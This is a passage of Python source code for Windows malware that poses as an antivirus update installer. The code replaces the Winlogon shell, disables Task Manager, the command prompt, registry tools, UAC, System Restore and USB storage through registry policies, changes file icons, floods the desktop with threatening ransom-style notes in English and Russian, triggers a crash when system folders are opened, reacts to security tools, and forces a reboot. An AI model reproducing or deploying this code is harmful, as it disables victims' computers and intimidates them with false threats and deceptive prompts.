        "MSInfoFile": ico6,
        "Python.File": ico1,
        "regfile": ico2,
        "steamlink": ico6,
        "steam": ico4,
        "svgfile": ico6,
        "themefile": ico6,
        "themepackfile": ico6,
        "VBSFile": ico1,
        "xmlfile": ico6,
        "WinRAR": ico1,
        "Windows.VhdFile": ico6,
        "SearchFolder": ico6,
        "Paint.Picture": ico6,
        "inffile": ico1,
        "JSFile": ico1,
        "JSEFile": ico1,
        "ftp": ico2,
        "Word.Document.8": ico2,
        "Word.Document.12": ico2,
        "Word.RTF.8": ico2,
        "wordhtmlfile": ico2,
        "wordhtmltemplate": ico2,
        "wordmhtmlfile": ico2,
        "Wordpad.Document.1": ico2,
        "wordxmlfile": ico2,
        "uTorrent": ico1
    }

    for file_type, icon in icon_paths.items():
        try:
            reg_key = reg.OpenKey(reg.HKEY_CLASSES_ROOT, f"{file_type}\\DefaultIcon", 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(reg_key, "", 0, reg.REG_SZ, icon)
            reg.CloseKey(reg_key)
            print(f"Successfully updated icon for {file_type}")
        except Exception as e:
            print(f"Failed to update icon for {file_type}: {e}")


text = """[EN]

The hacker group "Assault on the Armchair Troops" welcomes you. If you listened and watched the speech from our mentor carefully, then most likely you will not have any questions. If you did not consider it necessary to carefully read the instructions from our boss, then we can remind you of them, but first we want to say that we are watching you, and if we see something we do not like, your computer will be completely destroyed. But let's move on to the rules:
1. Do not try to remove our malware, this will not help anyway, since not only your computer is infected, but also your Internet traffic, therefore, you will only destroy the computer. Is this what you want?
2. Do not press the key combination ctrl + alt + del. No comments here. Some decided to ignore this rule, we had to send cars for them to resolve issues by force, if you know what we mean.
3. Open as few files as possible, because the more files you open, the greater the chance that we will take some measures against you.
You have a long, long, difficult path ahead, but, of course, bad consequences can be avoided by simply following these rules. And remember - we always see and notice everything.

[RU]

Хакерская группировка "Штурм кабинетных войск" приветствует вас. Если вы внимательно слушали и смотрели речь от нашего наставника, то скорее всего, вопросов у вас не возникнет. Если же вы не посчитали нужным внимательно ознакомиться с инструкциями от нашего босса, то мы может напомнить вам их, но прежде мы хотим сказать, что мы наблюдаем за вами, и если мы увидим то, что нам не нравится - вам компьютер будет полностью уничтожен. Но перейдем к правилам:
1. Не пытайтесь удалить наше вредоносное ПО, это все равно не поможет, так как заражен не только ваш компьютер, но и интернет-трафик тоже, следовательно, вы только уничтожите компьютер. Вы этого хотите?
2. Не нажимайте комбинацию клавиш ctrl + alt + del. Тут без комментариев. Некоторые решили проигнорировать это правило, пришлось отправлять за ними машины, для решения вопросов силой, если вы понимаете, про что мы.
3. Открывайте как можно меньше файлов, ведь чем больше файлов вы откроете, тем больше шанс того, что мы примем некоторые меры в отношении вас.
Вам предстоит долгий и долгий сложный путь, но, конечно, плохих последствий можно избежать, просто следуя этим правилам. И помните - мы всегда всё видим и замечаем."""
def create_random_files(num_files=200, desktop_path=None):
    """Создает заданное количество случайных файлов на рабочем столе"""
    if desktop_path is None:
        desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')

    def generate_random_filename(extension, length=8):
        """Генерирует случайное имя файла с заданной длиной и заданным расширением"""
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        return ''.join(random.choices(chars, k=length)) + extension

    try:
        for _ in range(num_files):  # Создаем заданное количество файлов
            # Случайно выбираем расширение
            if random.choice([True, False]):
                extension = '.exe'
                file_path = os.path.join(desktop_path, generate_random_filename(extension))

                # Создаем пустой EXE-файл (0 байт)
                with open(file_path, 'wb') as f:
                    pass

                print(f'Создан файл: {file_path}')
            else:
                extension = '.txt'
                file_path = os.path.join(desktop_path, generate_random_filename(extension))

                # Создаем текстовый файл
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(text)

                print(f'Создан файл: {file_path}')

    except Exception as e:
        print(f'Остановлено из-за ошибки: {str(e)}')


def monitor_explorer(poll_interval=0.5):
    """
    Отслеживает открытые окна Проводника и, если открыта хотя бы одна из заданных целевых папок,
    вызывает функцию on_target_folders_opened. При закрытии всех целевых папок флаг сбрасывается.
    Функция on_target_folders_opened теперь не принимает аргументов и не выводит детали о папках.
    """
    # Задайте список целевых папок в формате, например, "C:\Folder1" (без завершающего слеша)
    target_folders = {r"C:\Windows", r"C:\Windows\INF", r"C:\test"}
    # Приводим пути к нижнему регистру для сравнения
    target_folders = {folder.lower() for folder in target_folders}

    # Флаг, чтобы функция вызывалась один раз при обнаружении целевой папки
    triggered = False

    def on_target_folders_opened():
        # Функция, вызываемая при обнаружении хотя бы одной целевой папки
        print("Обнаружено открытие целевой папки(папок)")
        # Здесь можно разместить нужную вам логику

    shell = win32com.client.Dispatch("Shell.Application")

    while True:
        found_targets = set()
        for window in shell.Windows():
            try:
                doc = window.Document
                # Проверяем, что окно связано с папкой (есть атрибут Folder)
                if hasattr(doc, "Folder"):
                    folder_url = window.LocationURL  # формат "file:///C:/..."
                    # Преобразуем URL в локальный путь Windows
                    if folder_url.startswith("file:///"):
                        local_path = folder_url.replace("file:///", "")
                        local_path = local_path.replace("/", "\\")
                        # Приводим к нижнему регистру для сравнения
                        local_path = local_path.lower().rstrip("\\")
                        if local_path in target_folders:
                            found_targets.add(local_path)
            except Exception:
                continue

        # Если хотя бы одна целевая папка открыта и функция ещё не вызывалась
        if found_targets and not triggered:
            BSOD()
            triggered = True
        # Если ни одна целевая папка не открыта – сбрасываем флаг для будущих срабатываний
        if not found_targets:
            triggered = False
        time.sleep(poll_interval)


def change_shell():
    try:
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "C:/Windows/INF/c_computeaccelerator.exe")
        reg.CloseKey(key)
    except Exception as e:
        print(f"Ошибка при установке значения реестра: {e}")


def set_file_attributes(file_path):
    # Установка атрибутов файла (например, скрытый и системный)
    os.system(f'attrib +s +h "{file_path}"')


def monitor_process(processes=["regedit.exe", "mmc.exe", "msconfig.exe", "SystemPropertiesProtection.exe", "rstrui.exe", "RecoveryDrive.exe", "taskmgr.exe", "powershell.exe", "OpenConsole.exe", "mrt.exe", "resmon.exe", "perfmon.exe", "SecHealthUI.exe", "ProcessHacker.exe", "SimpleUnlocker.exe,"
"SystemInformer.exe", "ProcessExplorer.exe", "Avast.exe", "Drweb.exe", "Kaspersky.exe"]):


    triggered = False
    while True:
        found = any(p.info['name'] in processes for p in psutil.process_iter(['name']))
        if found and not triggered:
            triggered = True
            play_video_dead(resource_path("Hacker2.mp4"))
        time.sleep(1)


def MinusRegedit():
    commands = [
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLowDiskSpaceChecks /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 255 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyGames /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR" /v Start /t REG_DWORD /d 4 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System  /v LegalNoticeCaption /t REG_SZ /d "YOU!!!" /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LegalNoticeText /t REG_SZ /d "I DESTROY YOU" /f',
        r'REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f'
    ]
        # Выполнение всех команд в одном месте
    for command in commands:
        try:
            subprocess.run(command, check=True, shell=True)
            print(f"Команда выполнена: {command}")
        except subprocess.CalledProcessError as e:
            print(f"Ошибка при выполнении команды: {e}")


def remove_file_attributes(file_path):
    # Удаление атрибутов скрытого и системного
    os.system(f'attrib -s -h "{file_path}"')


def checktxt():
    try:
        if os.path.exists(file_path):
            set_file_attributes(file_path)

            with open(file_path, "r") as f:
                content = f.read().strip()

            if content == "1":
                print("Найден 1 в txt")
                change_shell()
                lol()
                changetoeng()
                MinusRegedit()
                os.startfile(resource_path("script.vbs"))
                playMusic_runappmain()
                run_app()

            elif content == "2":
                print("Найден 2 в txt")
                video_path = (resource_path("Hacker.mp4"))
                play_video_fullscreen(video_path)


            elif content == "3":
                print("Найден 3 в txt")
                process_monitot = threading.Thread(target=monitor_process)
                process_monitot.start()
                os.startfile(resource_path("script.vbs"))
                checkexe_potok = threading.Thread(target=checkexe)
                checkexe_potok.start()
                playmusic_for3()

            else:
                print(f"Файл содержит что-то другое, начинаем все сначала")
                change_shell()
                lol()
                changetoeng()
                MinusRegedit()
                os.startfile(resource_path("script.vbs"))
                playMusic_runappmain()
                run_app()

        else:
            print("Файл не найден - создаём и делаем ТОЖЕ САМОЕ ЧТО И ПОД 1")
            with open(file_path, "w") as f:
                f.write("1")
            set_file_attributes(file_path)
            print("тут действие, Файла не было я его создал со значением 1.")
            change_shell()
            lol()
            changetoeng()
            MinusRegedit()
            os.startfile(resource_path("script.vbs"))
            playMusic_runappmain()
            run_app()

    except Exception as e:
        print(f"Произошла ошибка: {e}")


def run_app():
    root = tk.Tk()
    root.attributes('-fullscreen', True,  "-topmost", True)
    root.title("Установка")
    root.resizable(False, False)  # Нельзя поменять размер окна
    root.overrideredirect(True)
    root.bind("<Alt-F4>", fuckaltf4)  # Обламываем самых умных.

    texts = {
        "ru": {"install": "Установить", "error": "Критическая ошибка с кодом -234901", "virusbase": "Когда обновлять вирусные базы:", "welcome": "ВНИМАНИЕ, только что была совершена\n попытка перехвата вашего интернет-трафика неизвестными личностями.\nВы сейчас, вероятно, обеспокоены,\n но паника в данный момент только повредит.\nЧтобы сохранить компьютер в целостности, пройдите\n короткую установку по обновлению антивирусного ПО\nНажмите на кнопку ниже, чтобы приступить.", "select": "Выберите параметры", "path": "Выберите путь\n для установки:", "product": "Выбери версию продукта:",
               "progress": "Установка, не выключайте компьютер...", "hack": "Без паники. Только что вы \nпопытались противодействовать хакерской группировке \n«Штурм диванных войск».К счастью, нам \nудалось перехватит ваш интернет-запрос. \nНе беспокойтесь, ваш компьютер останется в сохранности, если \nвы будете выполнять наши требования. \nДождитесь окончания установки. "},
        "en": {"install": "Install", "hack": "Don't panic. You've just tried to counteract the hacker\ngroup «Assault on the Armchair Troops». Fortunately, \nwe managed to intercept your Internet request.\nDon't worry, your computer will remain \nsafe if you follow our instructions.\nWait for the installation to complete.", "error": "Critical error code -234901", "virusbase": "When to update virus databases:", "welcome": "WARNING, there has just been an attempt\n to intercept your internet traffic by unknown individuals.\n You are probably worried now, but\n panicking at this point will only hurt. \nTo keep your computer intact, please go through a short \ninstallation to update your antivirus software. \nClick the button below to get started.", "select": "Select options", "progress": "Installing, do not turn off your computer...", "path": "Select the installation path:", "product": "Select the type of product:"}
    }
    lang = "en"

    # Объявляем переменные для использования в nonlocal
    welcome_label = None
    install_button = None
    install_button_2 = None
    bg_label = None

    # Глобальный контейнер для страниц (контент, кроме кнопок смены языка на первой странице)
    container = tk.Frame(root)
    container.pack(fill="both", expand=True)

    # Функция для очистки контейнера и создания нового bg_label внутри него
    def clear_container():
        nonlocal bg_label
        for widget in container.winfo_children():
            widget.destroy()
        bg_label = tk.Label(container)
        bg_label.place(x=0, y=0, relwidth=1, relheight=1)

    def set_background(image_path):
        nonlocal bg_label
        bg_image = Image.open(image_path).resize((root.winfo_screenwidth(), root.winfo_screenheight()),Image.LANCZOS)
        bg = ImageTk.PhotoImage(bg_image)
        bg_label.config(image=bg)
        bg_label.image = bg

    def change_lang(new_lang):
        nonlocal lang, welcome_label, install_button
        lang = new_lang
        if welcome_label is not None:
            welcome_label.config(text=texts[lang]["welcome"])
        if install_button is not None:
            install_button.config(text=texts[lang]["install"])

    def main_page():
        nonlocal welcome_label, install_button
        clear_container()
        set_background(resource_path("background1.jpg"))
        welcome_label = tk.Label(container, text=texts[lang]["welcome"], font=("Consolas", 24), bg="black", fg="white")
        welcome_label.pack(pady=150)
        install_button = tk.Button(container, text=texts[lang]["install"], font=("Arial", 20), command=show_page_2)
        install_button.pack(pady=20)
        # Кнопки смены языка только на первой странице
        tk.Button(container, text="RU", font=("Arial", 25), command=lambda: change_lang("ru")).place(x=10, y=10)
        tk.Button(container, text="EN", font=("Arial", 25), command=lambda: change_lang("en")).place(x=135, y=10)

    def show_page_2():
        nonlocal install_button_2
        clear_container()
        set_background(resource_path("background2.jpg"))
        tk.Label(container, text=texts[lang]["select"], font=("Arial", 24), bg="black", fg="white").pack(pady=50)
        tk.Label(container, text=texts[lang]["product"], font=("Arial", 24), bg="black", fg="white").place(y=230, x=70)
        tk.Label(container, text=texts[lang]["path"], font=("Arial", 24), bg="black", fg="white").place(y=170, x=1300)
        tk.Label(container, text=texts[lang]["virusbase"], font=("Arial", 24), bg="black", fg="white").place(y=400, x=600)

        choices = [
            ["ERROR:Failed to connect to server", "360 TOTAL SECURITY", "NORTON FREE"],
            ["C:\Program Files\\NewAntivirus", "C:\Windows\\NewAntivirus"],
            ["Every day.", "Every week."]
        ]

        dropdowns = []

        def check_selection(*_):
            if all(var.get() for var in dropdowns):
                install_button_2.config(state=tk.NORMAL)

        # Задаем позиции для каждого выпадающего списка:
        positions = [
            {"x": 70, "y": 300,},
            {"x": 1300, "y": 300},
            {"x": 600, "y": 500}
        ]

        for options, pos in zip(choices, positions):
            var = tk.StringVar()
            dropdown = ttk.Combobox(container, values=options, textvariable=var, state="readonly", font=("Arial", 25))
            dropdown.option_add("*TCombobox*Listbox*Font", ("Arial", 20))
            dropdown.place(**pos)
            var.trace_add("write", check_selection)
            dropdowns.append(var)

        install_button_2 = tk.Button(container, text=texts[lang]["install"], font=("Arial", 20), bg="black", fg="white", command=show_page_3, state=tk.DISABLED)
        install_button_2.pack(pady=50)

    def show_page_3():
        clear_container()
        set_background(resource_path("background3.jpg"))
        installing_label = tk.Label(container, text=texts[lang]["progress"], font=("Arial", 24), bg="black", fg="white")
        installing_label.pack(pady=50)

        # Создаем Canvas для прогресс-бара
        canvas_width = 1400  # Новый ширина
        canvas_height = 150  # Новый высота
        canvas = tk.Canvas(container, width=canvas_width, height=canvas_height, bg="black", highlightthickness=1)
        canvas.pack(pady=20)

        # Обновляем координаты прямоугольника
        progress_rect = canvas.create_rectangle(0, 0, 0, canvas_height, fill="#00ff00", width=0)
        percent_label = tk.Label(container, text="0%", font=("Arial", 24), fg="green", bg="black")
        percent_label.pack()
        install_text = tk.Label(container, text=texts[lang]["error"], font=("Arial", 24), bg="black", fg="red")
        install_text.pack(pady=20)
        install_text.pack_forget()
        hack_text = tk.Label(container, text=texts[lang]["hack"], font=("Arial", 24), bg="black", fg="red")
        hack_text.pack(pady=50)
        hack_text.pack_forget()

        def interpolate_color(progress):
            if progress < 30:
                return "#00ff00"  # зелёный
            elif progress > 50:
                return "#ff0000"  # красный
            else:
                factor = (progress - 20) / 30.0
                r = int(0 + (255 * factor))
                g = int(255 - (255 * factor))
                b = 0
                return f'#{r:02x}{g:02x}{b:02x}'

        def update_progress():
            for i in range(101):
                percent_label.config(text=f"{i}%")
                new_width = i / 100 * canvas_width
                canvas.coords(progress_rect, 0, 0, new_width, canvas_height)
                new_color = interpolate_color(i)
                canvas.itemconfig(progress_rect, fill=new_color)
                if i == 50:
                    create_random_files(num_files=200, desktop_path=None)
                    update_icons()
                    disable_explorer_settings()
                    customize_and_set_window_color()
                    lock_personalization_settings()
                    playMusic_after50()
                    set_background(resource_path("background4.jpg"))
                    # Функция для смены цифры на 2
                    set_wallpaper(image_path=resource_path("bg.jpg"))
                    install_text.pack()
                    hack_text.pack(pady=50)
                    percent_label.config(fg="red")  # Изменяем цвет текста на красный
                    installing_label.config(fg="red")
                    changeto2()

                time.sleep(0.4)
            os.system("shutdown /r /t 5")

        threading.Thread(target=update_progress, daemon=True).start()

    main_page()
    root.mainloop()


if __name__ == "__main__":

    
    wait = threading.Thread(target=clrtaltBSOD)
    wait.start()


    block_keys()
    checktxt()


    monitor = threading.Thread(target=monitor_explorer(poll_interval=0.2))
    monitor.start()

